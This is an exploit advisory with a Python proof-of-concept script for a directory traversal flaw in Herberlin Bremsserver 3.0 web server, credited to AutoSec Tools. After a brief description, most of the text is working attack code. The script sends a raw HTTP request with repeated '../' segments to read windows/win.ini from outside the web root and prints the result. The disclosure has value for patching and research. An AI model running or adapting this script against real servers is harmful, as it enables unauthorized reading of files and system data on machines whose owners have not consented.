# ------------------------------------------------------------------------
# Software................Herberlin Bremsserver 3.0
# Vulnerability...........Directory Traversal
# Threat Level............Serious (3/5)
# Download................http://tools.herberlin.de/bremsserver/index.shtml
# Discovery Date..........11/13/2011
# Tested On...............Windows 7
# ------------------------------------------------------------------------
# Author..................AutoSec Tools
# Site....................http://www.autosectools.com/
# Email...................John Leitch <john@autosectools.com>
# ------------------------------------------------------------------------
# 
# 
# --Description--
# 
# A directory traversal vulnerability in Herberlin Bremsserver 3.0 can
# be exploited to read files outside of the web root.
# 
# 
# --PoC--

import socket

host = 'localhost'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)    

s.send('GET /' + '../' * 16 + 'windows/win.ini HTTP/1.1\r\n'
       'Host: localhost\r\n\r\n')

print s.recv(8192)
